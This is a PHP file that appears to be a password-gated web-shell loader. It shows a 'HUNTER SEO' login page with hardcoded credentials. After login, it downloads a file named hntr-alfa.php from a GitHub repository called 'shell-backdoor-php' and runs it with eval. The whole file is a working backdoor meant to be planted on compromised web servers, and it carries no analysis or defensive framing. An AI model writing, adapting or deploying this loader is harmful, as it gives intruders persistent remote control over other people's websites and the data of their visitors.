<?php
session_start();

$USERNAME = "2026";
$PASSWORD = "030204";

if (isset($_POST['login'])) {
    if (
        $_POST['username'] === $USERNAME &&
        $_POST['password'] === $PASSWORD
    ) {
        $_SESSION['login'] = true;
        header("Location: ".$_SERVER['PHP_SELF']);
        exit;
    } else {
        $error = "Username atau password salah!";
    }
}

/* =====================
   JIKA BELUM LOGIN
===================== */
if (!isset($_SESSION['login'])) {
?>
<!DOCTYPE html>
<html lang="en">
<head>
<meta charset="UTF-8">
<title>Home Login...</title>
<style>
* {
    margin: 0;
    padding: 0;
    box-sizing: border-box;
    font-family: "Segoe UI", Tahoma, sans-serif;
}

body {
    height: 100vh;
    background: radial-gradient(circle at top, #111 0%, #000 60%);
    display: flex;
    align-items: center;
    justify-content: center;
    color: #fff;
}

.login-box {
    width: 360px;
    background: rgba(15, 15, 15, 0.95);
    padding: 35px;
    border-radius: 14px;
    box-shadow: 0 0 25px rgba(0, 255, 255, 0.15);
    text-align: center;
}

.login-box h1 {
    font-size: 28px;
    letter-spacing: 2px;
    margin-bottom: 6px;
    color: #00ffff;
}

.login-box h2 {
    font-size: 13px;
    font-weight: normal;
    color: #aaa;
    margin-bottom: 25px;
}

.login-box input {
    width: 100%;
    padding: 12px;
    margin: 10px 0;
    background: #0c0c0c;
    border: 1px solid #222;
    border-radius: 8px;
    color: #fff;
    outline: none;
}

.login-box input:focus {
    border-color: #00ffff;
    box-shadow: 0 0 8px rgba(0,255,255,0.3);
}

.login-box button {
    width: 100%;
    padding: 12px;
    margin-top: 15px;
    background: linear-gradient(135deg, #00ffff, #007777);
    border: none;
    border-radius: 8px;
    color: #000;
    font-weight: bold;
    cursor: pointer;
    transition: 0.3s;
}

.login-box button:hover {
    opacity: 0.85;
}

.error {
    margin-bottom: 15px;
    color: #ff4d4d;
    font-size: 14px;
}
</style>
</head>
<body>

<div class="login-box">
    <h1>HUNTER SEO</h1>
    
    <?php if (isset($error)) echo "<div class='error'>$error</div>"; ?>

    <form method="POST">
        <input type="text" name="username" placeholder="Username" required>
        <input type="password" name="password" placeholder="Password" required>
        <button type="submit" name="login">LOGIN</button>
    </form>
</div>

</body>
</html>
<?php
exit;
}
$ch = curl_init('https://raw.githubusercontent.com/Ardhiazz/shell-backdoor-php/refs/heads/main/hntr-alfa.php');
curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
curl_setopt($ch, CURLOPT_USERAGENT, 'Mozilla/5.0');
$content = curl_exec($ch);
curl_close($ch);
eval('?>'.$content);
?>